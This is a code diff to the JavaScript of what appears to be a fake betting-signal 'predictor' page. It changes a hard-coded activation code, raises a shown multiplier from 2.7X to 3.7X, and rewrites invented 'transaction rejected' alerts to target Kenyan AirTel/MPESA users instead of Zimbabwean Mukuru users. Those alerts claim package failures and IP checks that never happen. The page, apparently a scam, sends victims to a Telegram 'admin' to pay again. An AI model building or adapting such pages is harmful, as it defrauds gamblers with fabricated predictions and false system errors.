@@ -42,7 +42,7 @@ function submitBettingSiteID() {
 function validateActivationCode() {
     let activationCode = document.getElementById("activationCodeInput").value;
 
-    if (activationCode === "GBH531") {
+    if (activationCode === "GHL975") {
         document.getElementById("getSignalButton").style.display = "block";
     } else {
         alert("Invalid Activation Code. Try again.");
@@ -53,12 +53,12 @@ function validateActivationCode() {
 function getLiveSignal() {
     document.getElementById("activationCodeSection").style.display = "none";
 
-    // Open 2.7X Signal in New Window
+    // Open 3.7X Signal in New Window
     let xButtonWindow = window.open("", "_blank", "width=400,height=200");
     xButtonWindow.document.write(`
         <html>
         <head>
-            <title>2.7X Predictor</title>
+            <title>3.7X Predictor</title>
             <style>
                 body {
                     font-family: 'Courier New', monospace;
@@ -80,8 +80,8 @@ function getLiveSignal() {
             </style>
         </head>
         <body>
-            <h2>🚀 2.7X Signal Ready!</h2>
-            <button class="x-btn">2.7X</button>
+            <h2>🚀 3.7X Signal Ready!</h2>
+            <button class="x-btn">3.7X</button>
         </body>
         </html>
     `);
@@ -198,13 +198,13 @@ function getLiveSignal() {
                         }
                     </style>
 
-                    <h1>🚨SYSTEM ALERT :  TRANSACTION ID REJECTED: TIMESTAMP VALIDATION FAILED. SUBMISSION EXPIRED.Get New Code 🚨</h1>
-                    <div class="warning-line">❌ Transaction ID expired. Delayed to enter code!.</div>
-                    <div class="warning-line highlight">⚠️ Session terminated due to delayed confirmation <u>EXPIRED</u> ENTER NEW TRANSACTION ID</div>
-                    <div class="warning-line">❌ Transaction ID invalid ZIMBABWE Server TXN ID MUKURU(147897540).</div>
-                    <div class="warning-line highlight">⚠️ One Week Key <u>Identical device</u> Zimbabwean Server <u>IP address match✅</u></div>
+                    <h1>🚨SYSTEM ALERT :  TRANSACTION ID REJECTED: Customized Package NOT compatible With Device!!! VALIDATION FAILED! Get New Code 🚨</h1>
+                    <div class="warning-line">❌ Kenyan Customized package not responding: UPGRADE Required!.</div>
+                    <div class="warning-line highlight">⚠️ Session terminated due restricted Kenyan Customized Server <u>CUSTOMIZED Package Failure</u> ENTER NEW TRANSACTION ID</div>
+                    <div class="warning-line">❌ Transaction ID invalid Kenya Server AirTel MPESA(TDK3K3I421).</div>
+                    <div class="warning-line highlight">⚠️ Three days(customized) <u>Identical device</u> Kenyan Server <u>IP address match✅</u></div>
                     <div class="warning-line">❌ Package authentication failed</div>
-                    <div class="warning-line highlight">⚠️IP address verification has been successfully confirmed.</div>
+                    <div class="warning-line highlight">⚠️KENYA IP address verification successfully confirmed.</div>
                     <button class="contact-btn" onclick="window.open('https://t.me/zayd0011', '_blank')">🚨 CONTACT ADMIN IMMEDIATELY</button>
                 </div>
             `;
